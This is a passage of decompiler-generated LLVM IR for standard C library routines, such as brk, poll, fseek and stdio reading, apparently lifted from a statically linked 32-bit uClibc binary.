  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-196.013, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_805313d, { 1, 0 }
  uselistorder i8 %v2_805313783, { 1, 0 }
  uselistorder i32 %v2_805311e, { 1, 0 }
  uselistorder i8 %v2_805311868, { 1, 0 }
  uselistorder i32 %v1_8053117, { 0, 2, 1, 3 }
  uselistorder i32 %v2_80530e1, { 1, 0 }
  uselistorder i32 %v1_80530d6, { 1, 0, 2 }
  uselistorder i32 %v2_8053251, { 2, 3, 0, 1 }
  uselistorder i32 %v2_80530bf, { 1, 0 }
  uselistorder i32 %v2_80530a1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 1, 3, 4, 5, 2, 0, 6, 7, 9, 8 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32)* @free, { 18, 16, 15, 14, 13, 12, 11, 10, 26, 25, 24, 23, 2, 9, 8, 7, 6, 5, 17, 0, 19, 22, 21, 20, 4, 3, 1 }
  uselistorder i32* @global_var_80601b8.281, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 1, 0, 2, 3 }
  uselistorder i8 10, { 0, 1, 2, 14, 3, 4, 5, 6, 7, 8, 15, 9, 16, 10, 11, 12, 13, 17 }
  uselistorder i32 164, { 1, 0 }
  uselistorder i32* @global_var_80601b4.221, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8059ac8.220 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_805327f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80530d7.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_805323f, { 1, 0 }
  uselistorder label %dec_label_pc_80531df, { 1, 0 }
  uselistorder label %dec_label_pc_8053207.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80531b5, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80531aa, { 1, 0 }
  uselistorder label %dec_label_pc_8053160, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053159, { 1, 0 }
  uselistorder label %dec_label_pc_8053150, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805313d, { 1, 0 }
  uselistorder label %dec_label_pc_805311e, { 1, 0 }
  uselistorder label %dec_label_pc_805324a.backedge, { 0, 3, 4, 2, 7, 6, 5, 1 }
  uselistorder label %dec_label_pc_805324a.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_80532bf = inttoptr i32 %arg3 to i32*
  %v10_80532bf = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_80532bf, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_80532bf
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80532cb = call i32 @__libc_getpid()
  %v2_80532d7 = call i32 @kill(i32 %v0_80532cb, i32 %arg1)
  ret i32 %v2_80532d7

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 3, 1, 2 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_80532e0 = load i32, i32* @eax, align 4
  %v1_80532e0 = add i32 %v0_80532e0, 28
  %v2_80532e0 = inttoptr i32 %v1_80532e0 to i32*
  %v3_80532e0 = load i32, i32* %v2_80532e0, align 4
  store i32 %v3_80532e0, i32* @global_var_80601bc.290, align 4
  %v1_80532e9 = add i32 %v0_80532e0, 44
  %v2_80532e9 = inttoptr i32 %v1_80532e9 to i32*
  %v3_80532e9 = load i32, i32* %v2_80532e9, align 4
  store i32 %v3_80532e9, i32* @global_var_80601c0.291, align 64
  ret i32 %v3_80532e9
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80532f4 = load i32, i32* @ebx, align 4
  store i32 %v0_80532f4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8053307 = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8053307, i32* @global_var_805fd84.268, align 4
  %v7_8053312 = icmp ult i32 %v1_8053307, %arg1
  %v1_8053314 = icmp eq i1 %v7_8053312, false
  br i1 %v1_8053314, label %dec_label_pc_8053324, label %dec_label_pc_8053316

dec_label_pc_8053316:                             ; preds = %entry
  %v0_8053316 = load i32, i32* %stack_var_-4, align 4
  %v1_8053316 = call i32 @__errno_location(i32 %v0_8053316)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_805331e = inttoptr i32 %v1_8053316 to i32*
  store i32 12, i32* %v1_805331e, align 4
  %v0_8053324.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053324

dec_label_pc_8053324:                             ; preds = %entry, %dec_label_pc_8053316
  %v0_8053324 = phi i32 [ 0, %entry ], [ %v0_8053324.pre, %dec_label_pc_8053316 ]
  %v2_8053328 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053328, i32* @ebx, align 4
  ret i32 %v0_8053324

; uselistorder directives
  uselistorder i32 %v1_8053307, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_805fd84.268, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053324, { 1, 0 }
}

define i32 @__libc_poll() local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805332c = load i32, i32* @edi, align 4
  store i32 %v0_805332c, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_805333c = load i32, i32* @ebx, align 4
  %v1_805333d = inttoptr i32 %tmp4 to %pollfd*
  %v5_8053344 = call i32 @poll(%pollfd* %v1_805333d, i32 %tmp3, i32 %tmp)
  store i32 %v0_805333c, i32* @ebx, align 4
  store i32 %v5_8053344, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_8053344, -4095
  br i1 %tmp10, label %dec_label_pc_805335c, label %dec_label_pc_8053350

dec_label_pc_8053350:                             ; preds = %entry
  %v1_8053350 = call i32 @__errno_location(i32 %v0_805333c)
  %v0_8053355 = load i32, i32* %edi.global-to-local, align 4
  %v1_8053355 = sub i32 0, %v0_8053355
  %v2_8053357 = inttoptr i32 %v1_8053350 to i32*
  store i32 %v1_8053355, i32* %v2_8053357, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805335c

dec_label_pc_805335c:                             ; preds = %entry, %dec_label_pc_8053350
  %v0_805335c = phi i32 [ %v5_8053344, %entry ], [ -1, %dec_label_pc_8053350 ]
  %v2_8053360 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053360, i32* @edi, align 4
  ret i32 %v0_805335c

; uselistorder directives
  uselistorder i32 %v5_8053344, { 1, 0, 2 }
  uselistorder i32 %v0_805333c, { 1, 0 }
  uselistorder label %dec_label_pc_805335c, { 1, 0 }
}

define i32 @__GI_fseek(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_805336f = ashr i32 %arg2, 31
  %v4_8053376 = inttoptr i32 %arg1 to i16*
  %v5_8053376 = call i32 @__GI_fseeko64(i16* %v4_8053376, i32 %arg2, i32 %v1_805336f, i32 %arg3)
  ret i32 %v5_8053376
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8053380 = load i32, i32* @ebp, align 4
  %v0_8053381 = load i32, i32* @edi, align 4
  %v0_8053382 = load i32, i32* @esi, align 4
  %v0_8053383 = load i32, i32* @ebx, align 4
  store i32 %arg4, i32* @edi, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* @edx, align 4
  %v4_8053393 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8053393, i32* @esi, align 4
  store i32 %arg2, i32* %stack_var_-28, align 4
  %tmp28 = icmp ult i32 %arg4, 3
  br i1 %tmp28, label %dec_label_pc_80533b7, label %dec_label_pc_80533a4

dec_label_pc_80533a4:                             ; preds = %entry
  %v1_80533a4 = call i32 @__errno_location(i32 %arg2)
  store i32 %v1_80533a4, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v1_80533ac = inttoptr i32 %v1_80533a4 to i32*
  store i32 22, i32* %v1_80533ac, align 4
  br label %dec_label_pc_8053459

dec_label_pc_80533b7:                             ; preds = %entry
  %v1_80533b7 = add i32 %v4_8053393, 52
  %v2_80533b7 = inttoptr i32 %v1_80533b7 to i32*
  %v3_80533b7 = load i32, i32* %v2_80533b7, align 4
  %v1_80533ba = icmp eq i32 %v3_80533b7, 0
  %v1_80533bc = icmp eq i1 %v1_80533ba, false
  br i1 %v1_80533bc, label %dec_label_pc_80533dd, label %dec_label_pc_80533be

dec_label_pc_80533be:                             ; preds = %dec_label_pc_80533b7
  %v1_80533be = add i32 %v4_8053393, 56
  store i32 %v1_80533be, i32* @ebx, align 4
  %v2_80533c8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_80533c8, i32* @eax, align 4
  %v3_80533cd = call i32 @__pthread_return_void(i32 %v2_80533c8, i32 134550975)
  store i32 %v3_80533cd, i32* %eax.global-to-local, align 4
  %v0_80533d2 = load i32, i32* @ebx, align 4
  %v2_80533d5 = call i32 @__pthread_return_0(i32 %v0_80533d2)
  store i32 %v2_80533d5, i32* %eax.global-to-local, align 4
  %v0_80533dd.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80533dd

dec_label_pc_80533dd:                             ; preds = %dec_label_pc_80533b7, %dec_label_pc_80533be
  %v0_80533e5 = phi i32 [ %v4_8053393, %dec_label_pc_80533b7 ], [ %v0_80533dd.pre, %dec_label_pc_80533be ]
  %v1_80533dd = inttoptr i32 %v0_80533e5 to i8*
  %v2_80533dd = load i8, i8* %v1_80533dd, align 1
  %v3_80533dd = and i8 %v2_80533dd, 64
  %v4_80533dd = icmp eq i8 %v3_80533dd, 0
  br i1 %v4_80533dd, label %dec_label_pc_80533f2, label %dec_label_pc_80533e2

dec_label_pc_80533e2:                             ; preds = %dec_label_pc_80533dd
  %v2_80533e6 = call i32 @__stdio_wcommit(i32 %v0_80533e5)
  store i32 %v2_80533e6, i32* %eax.global-to-local, align 4
  %v1_80533ee = icmp eq i32 %v2_80533e6, 0
  %v1_80533f0 = icmp eq i1 %v1_80533ee, false
  br i1 %v1_80533f0, label %dec_label_pc_8053441, label %dec_label_pc_80533f2

dec_label_pc_80533f2:                             ; preds = %dec_label_pc_80533e2, %dec_label_pc_80533dd
  %v0_80533f2 = load i32, i32* @edi, align 4
  %v9_80533f2 = icmp eq i32 %v0_80533f2, 1
  %v1_80533f5 = icmp eq i1 %v9_80533f2, false
  br i1 %v1_80533f5, label %dec_label_pc_80533f2.dec_label_pc_805340b_crit_edge, label %dec_label_pc_80533f7

dec_label_pc_80533f2.dec_label_pc_805340b_crit_edge: ; preds = %dec_label_pc_80533f2
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_805340b

dec_label_pc_80533f7:                             ; preds = %dec_label_pc_80533f2
  %v0_80533f7 = load i32, i32* @ecx, align 4
  %v2_80533f9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_80533f9, i32* %eax.global-to-local, align 4
  %v0_80533fe = load i32, i32* @esi, align 4
  %tmp26 = inttoptr i32 %v0_80533fe to i32*
  %v6_80533ff = call i32 @__stdio_adjust_position(i32* %tmp26, i32 %v2_80533f9, i32 %v0_80533f7, i32 %v0_80533f7)
  store i32 %v6_80533ff, i32* %eax.global-to-local, align 4
  %v2_8053407 = icmp slt i32 %v6_80533ff, 0
  br i1 %v2_8053407, label %dec_label_pc_8053441, label %dec_label_pc_80533f7.dec_label_pc_805340b_crit_edge

dec_label_pc_80533f7.dec_label_pc_805340b_crit_edge: ; preds = %dec_label_pc_80533f7
  %v0_805340c.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805340b

dec_label_pc_805340b:                             ; preds = %dec_label_pc_80533f2.dec_label_pc_805340b_crit_edge, %dec_label_pc_80533f7.dec_label_pc_805340b_crit_edge
  %v2_805340d.pre-phi = phi i32 [ %.pre6, %dec_label_pc_80533f2.dec_label_pc_805340b_crit_edge ], [ %v2_80533f9, %dec_label_pc_80533f7.dec_label_pc_805340b_crit_edge ]
  %v0_805340c = phi i32 [ %v0_80533f2, %dec_label_pc_80533f2.dec_label_pc_805340b_crit_edge ], [ %v0_805340c.pre, %dec_label_pc_80533f7.dec_label_pc_805340b_crit_edge ]
  %v0_805340b = load i32, i32* @edx, align 4
  store i32 %v2_805340d.pre-phi, i32* %eax.global-to-local, align 4
  %v0_8053412 = load i32, i32* @esi, align 4
  %v5_8053413 = inttoptr i32 %v2_805340d.pre-phi to i32*
  %v6_8053413 = call i32 @__stdio_seek(i32 %v0_8053412, i32* %v5_8053413, i32 %v0_805340c, i32 %v0_805340b)
  store i32 %v6_8053413, i32* %eax.global-to-local, align 4
  %v2_805341b = icmp slt i32 %v6_8053413, 0
  br i1 %v2_805341b, label %dec_label_pc_8053441, label %dec_label_pc_805341f

dec_label_pc_805341f:                             ; preds = %dec_label_pc_805340b
  %v0_805341f = load i32, i32* @esi, align 4
  %v1_805341f = inttoptr i32 %v0_805341f to i16*
  %v2_805341f = load i16, i16* %v1_805341f, align 2
  %v3_805341f = and i16 %v2_805341f, -72
  store i16 %v3_805341f, i16* %v1_805341f, align 2
  %v0_8053423 = load i32, i32* @esi, align 4
  %v1_8053423 = add i32 %v0_8053423, 8
  %v2_8053423 = inttoptr i32 %v1_8053423 to i32*
  %v3_8053423 = load i32, i32* %v2_8053423, align 4
  store i32 %v3_8053423, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v2_8053428 = add i32 %v0_8053423, 16
  %v3_8053428 = inttoptr i32 %v2_8053428 to i32*
  store i32 %v3_8053423, i32* %v3_8053428, align 4
  %v0_805342b = load i32, i32* %eax.global-to-local, align 4
  %v1_805342b = load i32, i32* @esi, align 4
  %v2_805342b = add i32 %v1_805342b, 20
  %v3_805342b = inttoptr i32 %v2_805342b to i32*
  store i32 %v0_805342b, i32* %v3_805342b, align 4
  %v0_805342e = load i32, i32* %eax.global-to-local, align 4
  %v1_805342e = load i32, i32* @esi, align 4
  %v2_805342e = add i32 %v1_805342e, 24
  %v3_805342e = inttoptr i32 %v2_805342e to i32*
  store i32 %v0_805342e, i32* %v3_805342e, align 4
  %v0_8053431 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053431 = load i32, i32* @esi, align 4
  %v2_8053431 = add i32 %v1_8053431, 28
  %v3_8053431 = inttoptr i32 %v2_8053431 to i32*
  store i32 %v0_8053431, i32* %v3_8053431, align 4
  %v0_8053434 = load i32, i32* @esi, align 4
  %v1_8053434 = add i32 %v0_8053434, 44
  %v2_8053434 = inttoptr i32 %v1_8053434 to i32*
  store i32 0, i32* %v2_8053434, align 4
  %v0_805343b = load i32, i32* @esi, align 4
  %v1_805343b = add i32 %v0_805343b, 2
  %v2_805343b = inttoptr i32 %v1_805343b to i8*
  store i8 0, i8* %v2_805343b, align 1
  br label %dec_label_pc_8053444

dec_label_pc_8053441:                             ; preds = %dec_label_pc_805340b, %dec_label_pc_80533f7, %dec_label_pc_80533e2
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053444

dec_label_pc_8053444:                             ; preds = %dec_label_pc_805341f, %dec_label_pc_8053441
  br i1 %v1_80533bc, label %dec_label_pc_8053459, label %dec_label_pc_8053448

dec_label_pc_8053448:                             ; preds = %dec_label_pc_8053444
  %v2_805344c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_805344c, i32* @eax, align 4
  %v3_8053451 = call i32 @__pthread_return_void(i32 %v2_805344c, i32 1)
  store i32 %v3_8053451, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053459

dec_label_pc_8053459:                             ; preds = %dec_label_pc_8053444, %dec_label_pc_80533a4, %dec_label_pc_8053448
  %v0_805345c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805345c, i32* %eax.global-to-local, align 4
  store i32 %v0_8053383, i32* @ebx, align 4
  store i32 %v0_8053382, i32* @esi, align 4
  store i32 %v0_8053381, i32* @edi, align 4
  store i32 %v0_8053380, i32* @ebp, align 4
  ret i32 %v0_805345c

; uselistorder directives
  uselistorder i32 %v2_805340d.pre-phi, { 1, 0 }
  uselistorder i32 %v0_80533f2, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 (i32)* @__pthread_return_0, { 28, 4, 3, 18, 17, 16, 15, 14, 5, 27, 33, 32, 12, 1, 0, 2, 8, 31, 7, 13, 21, 20, 19, 23, 22, 30, 11, 29, 6, 10, 9, 26, 25, 24 }
  uselistorder i32 (i32, i32)* @__pthread_return_void, { 49, 48, 45, 2, 1, 0, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 4, 3, 47, 46, 59, 58, 57, 56, 16, 15, 8, 7, 55, 54, 6, 5, 18, 17, 34, 33, 32, 31, 30, 29, 38, 37, 36, 35, 53, 52, 14, 13, 51, 50, 12, 11, 10, 9, 44, 43, 42, 41, 40, 39 }
  uselistorder i32 134550975, { 2, 3, 27, 28, 29, 30, 31, 32, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12, 1, 20, 21, 22, 13, 14, 15, 16, 17, 18, 23, 24, 25, 26, 19 }
  uselistorder i32 52, { 7, 1, 12, 0, 2, 3, 4, 13, 14, 5, 10, 6, 8, 15, 11, 9 }
  uselistorder i32 22, { 8, 14, 2, 3, 4, 5, 6, 13, 12, 9, 10, 11, 15, 7, 0, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053459, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053444, { 1, 0 }
  uselistorder label %dec_label_pc_805340b, { 1, 0 }
  uselistorder label %dec_label_pc_80533dd, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053464 = load i32, i32* @ebx, align 4
  store i32 %v0_8053464, i32* %stack_var_-4, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v4_805346a = ptrtoint i16* %arg1 to i32
  store i32 %v4_805346a, i32* @ebx, align 4
  %v1_8053472 = bitcast i16* %arg1 to i8*
  %v2_8053472 = load i8, i8* %v1_8053472, align 1
  %v3_8053472 = and i8 %v2_8053472, 4
  %v4_8053472 = icmp eq i8 %v3_8053472, 0
  %v1_8053475 = icmp eq i1 %v4_8053472, false
  br i1 %v1_8053475, label %dec_label_pc_80534a4, label %dec_label_pc_8053477

dec_label_pc_8053477:                             ; preds = %entry
  %v2_8053477 = icmp slt i32 %arg3, 0
  %v1_8053479 = icmp eq i1 %v2_8053477, false
  br i1 %v1_8053479, label %dec_label_pc_8053480, label %dec_label_pc_805347b

dec_label_pc_805347b:                             ; preds = %dec_label_pc_8053477
  br label %dec_label_pc_8053480

dec_label_pc_8053480:                             ; preds = %dec_label_pc_8053477, %dec_label_pc_805347b
  %v0_8053481 = phi i32 [ %arg3, %dec_label_pc_8053477 ], [ 2147483647, %dec_label_pc_805347b ]
  %v1_8053486 = add i32 %v4_805346a, 4
  %v2_8053486 = inttoptr i32 %v1_8053486 to i32*
  %v3_8053486 = load i32, i32* %v2_8053486, align 4
  %v3_8053489 = inttoptr i32 %arg2 to i32*
  %v4_8053489 = call i32 @__libc_read(i32 %v3_8053486, i32* %v3_8053489, i32 %v0_8053481)
  store i32 %v4_8053489, i32* %eax.global-to-local, align 4
  %tmp13 = icmp slt i32 %v4_8053489, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_80534a4, label %dec_label_pc_8053496

dec_label_pc_8053496:                             ; preds = %dec_label_pc_8053480
  %v1_8053491 = icmp eq i32 %v4_8053489, 0
  %v4_8053494 = icmp eq i1 %v1_8053491, false
  %v0_805349e = load i32, i32* @ebx, align 4
  %v1_805349e = inttoptr i32 %v0_805349e to i16*
  %v2_805349e = load i16, i16* %v1_805349e, align 2
  br i1 %v4_8053494, label %dec_label_pc_805349e, label %dec_label_pc_8053498

dec_label_pc_8053498:                             ; preds = %dec_label_pc_8053496
  %v3_8053498 = or i16 %v2_805349e, 4
  store i16 %v3_8053498, i16* %v1_805349e, align 2
  %v0_80534a7.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80534a4

dec_label_pc_805349e:                             ; preds = %dec_label_pc_8053496
  %v3_805349e = or i16 %v2_805349e, 8
  store i16 %v3_805349e, i16* %v1_805349e, align 2
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80534a4

dec_label_pc_80534a4:                             ; preds = %dec_label_pc_8053480, %entry, %dec_label_pc_8053498, %dec_label_pc_805349e
  %v0_80534a7 = phi i32 [ %v4_8053489, %dec_label_pc_8053480 ], [ 0, %entry ], [ %v0_80534a7.pre, %dec_label_pc_8053498 ], [ 0, %dec_label_pc_805349e ]
  %v2_80534a6 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80534a6, i32* @ebx, align 4
  ret i32 %v0_80534a7

; uselistorder directives
  uselistorder i16 %v2_805349e, { 1, 0 }
  uselistorder i32 %v4_8053489, { 1, 2, 0, 3 }
  uselistorder i16 4, { 1, 0 }
  uselistorder i32 (i32, i32*, i32)* @__libc_read, { 1, 0, 2 }
  uselistorder i32 2147483647, { 0, 2, 1, 3 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80534a4, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8053480, { 1, 0 }
}

define i32 @__stdio_adjust_position(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  store i32 %tmp6, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_80534b8 = load i32, i32* %arg1, align 4
  store i32 %v2_80534b8, i32* %esi.global-to-local, align 4
  %v1_80534bf = urem i32 %v2_80534b8, 4
  %v2_80534bf = icmp eq i32 %v1_80534bf, 0
  store i32 %v1_80534bf, i32* %ecx.global-to-local, align 4
  br i1 %v2_80534bf, label %dec_label_pc_80534ee, label %dec_label_pc_80534c4

dec_label_pc_80534c4:                             ; preds = %entry
  %v1_80534c6 = add nsw i32 %v1_80534bf, -1
  %v8_80534c6 = icmp eq i32 %v1_80534c6, 0
  store i32 %v1_80534c6, i32* @edx, align 4
  br i1 %v8_80534c6, label %dec_label_pc_80534ee, label %dec_label_pc_80534c9

dec_label_pc_80534c9:                             ; preds = %dec_label_pc_80534c4
  %v3_80534c9 = and i32 %v2_80534b8, 2048
  %v4_80534c9 = icmp eq i32 %v3_80534c9, 0
  br i1 %v4_80534c9, label %dec_label_pc_80534ee, label %dec_label_pc_80534ce

dec_label_pc_80534ce:                             ; preds = %dec_label_pc_80534c9
  %v6_80534ce = sub nsw i32 1, %v1_80534bf
  %v7_80534ce = and i32 %v1_80534c6, %v6_80534ce
  %v8_80534ce = icmp slt i32 %v7_80534ce, 0
  %v9_80534ce = icmp eq i32 %v1_80534bf, 2
  %v10_80534ce = icmp ult i32 %v1_80534bf, 2
  %v3_80534d1 = icmp eq i1 %v10_80534ce, %v8_80534ce
  %v4_80534d1 = icmp eq i1 %v9_80534ce, false
  %v5_80534d1 = and i1 %v4_80534d1, %v3_80534d1
  br i1 %v5_80534d1, label %dec_label_pc_8053544, label %dec_label_pc_80534d3

dec_label_pc_80534d3:                             ; preds = %dec_label_pc_80534ce
  %v1_80534d3 = add i32 %tmp6, 40
  %v2_80534d3 = inttoptr i32 %v1_80534d3 to i32*
  %v3_80534d3 = load i32, i32* %v2_80534d3, align 4
  %v4_80534d3 = icmp eq i32 %v3_80534d3, 0
  %v1_80534d7 = icmp eq i1 %v4_80534d3, false
  br i1 %v1_80534d7, label %dec_label_pc_8053544, label %dec_label_pc_80534d9

dec_label_pc_80534d9:                             ; preds = %dec_label_pc_80534d3
  %v1_80534d9 = add i32 %tmp6, 3
  %v2_80534d9 = inttoptr i32 %v1_80534d9 to i8*
  %v3_80534d9 = load i8, i8* %v2_80534d9, align 1
  %v4_80534d9 = zext i8 %v3_80534d9 to i32
  %v2_80534dd = sub nsw i32 %v1_80534c6, %v4_80534d9
  %v1_80534df = add i32 %tmp6, 44
  %v2_80534df = inttoptr i32 %v1_80534df to i32*
  %v3_80534df = load i32, i32* %v2_80534df, align 4
  %v1_80534e3 = add nsw i32 %v2_80534dd, -1
  %tmp12 = icmp slt i32 %v3_80534df, 1
  br i1 %tmp12, label %dec_label_pc_80534ee, label %dec_label_pc_80534e8

dec_label_pc_80534e8:                             ; preds = %dec_label_pc_80534d9
  %v1_80534e8 = add i32 %tmp6, 2
  %v2_80534e8 = inttoptr i32 %v1_80534e8 to i8*
  %v3_80534e8 = load i8, i8* %v2_80534e8, align 1
  %v4_80534e8 = zext i8 %v3_80534e8 to i32
  %v2_80534ec = sub nsw i32 %v1_80534e3, %v4_80534e8
  br label %dec_label_pc_80534ee

dec_label_pc_80534ee:                             ; preds = %dec_label_pc_80534d9, %dec_label_pc_80534c9, %dec_label_pc_80534c4, %entry, %dec_label_pc_80534e8
  %v0_8053505 = phi i32 [ %v1_80534e3, %dec_label_pc_80534d9 ], [ %v1_80534c6, %dec_label_pc_80534c9 ], [ 0, %dec_label_pc_80534c4 ], [ 0, %entry ], [ %v2_80534ec, %dec_label_pc_80534e8 ]
  %v2_80534ee = and i32 %v2_80534b8, 64
  %v3_80534ee = icmp eq i32 %v2_80534ee, 0
  %storemerge.in.in.v = select i1 %v3_80534ee, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp6
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_80534fd = add i32 %tmp6, 16
  %v3_80534fd = inttoptr i32 %v2_80534fd to i32*
  %v4_80534fd = load i32, i32* %v3_80534fd, align 4
  %v5_80534fd = sub i32 %storemerge, %v4_80534fd
  %v1_8053500 = inttoptr i32 %arg2 to i32*
  %v2_8053500 = load i32, i32* %v1_8053500, align 4
  store i32 %v2_8053500, i32* %ecx.global-to-local, align 4
  %v1_8053502 = add i32 %arg2, 4
  %v2_8053502 = inttoptr i32 %v1_8053502 to i32*
  %v3_8053502 = load i32, i32* %v2_8053502, align 4
  store i32 %v3_8053502, i32* %ebx.global-to-local, align 4
  %v2_8053505 = add i32 %v5_80534fd, %v0_8053505
  store i32 %v2_8053505, i32* %esi.global-to-local, align 4
  %v2_8053510 = ashr i32 %v2_8053505, 31
  %v5_8053519 = sub i32 %v2_8053500, %v2_8053505
  %v10_8053519 = icmp ult i32 %v2_8053500, %v2_8053505
  %v6_805351d = zext i1 %v10_8053519 to i32
  %tmp = icmp slt i32 %v2_8053505, 0
  %v2_8053510.neg = zext i1 %tmp to i32
  %v7_805351d = add i32 %v3_8053502, %v2_8053510.neg
  %v8_805351d = add i32 %v7_805351d, %v6_805351d
  store i32 %v8_805351d, i32* @edx, align 4
  store i32 %v5_8053519, i32* %v1_8053500, align 4
  %v0_8053523 = load i32, i32* @edx, align 4
  %v1_8053523 = load i32, i32* %edi.global-to-local, align 4
  %v2_8053523 = add i32 %v1_8053523, 4
  %v3_8053523 = inttoptr i32 %v2_8053523 to i32*
  store i32 %v0_8053523, i32* %v3_8053523, align 4
  %v0_8053526 = load i32, i32* %edi.global-to-local, align 4
  %v1_8053526 = add i32 %v0_8053526, 4
  %v2_8053526 = inttoptr i32 %v1_8053526 to i32*
  %v3_8053526 = load i32, i32* %v2_8053526, align 4
  %v4_8053526 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8053529 = icmp slt i32 %v3_8053526, %v4_8053526
  br i1 %v5_8053529, label %dec_label_pc_8053533, label %dec_label_pc_805352b

dec_label_pc_805352b:                             ; preds = %dec_label_pc_80534ee
  %v8_805352b = icmp sgt i32 %v3_8053526, %v4_8053526
  br i1 %v8_805352b, label %dec_label_pc_8053531, label %dec_label_pc_805352d

dec_label_pc_805352d:                             ; preds = %dec_label_pc_805352b
  %v1_805352d = inttoptr i32 %v0_8053526 to i32*
  %v2_805352d = load i32, i32* %v1_805352d, align 4
  %v3_805352d = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_805352d, %v3_805352d
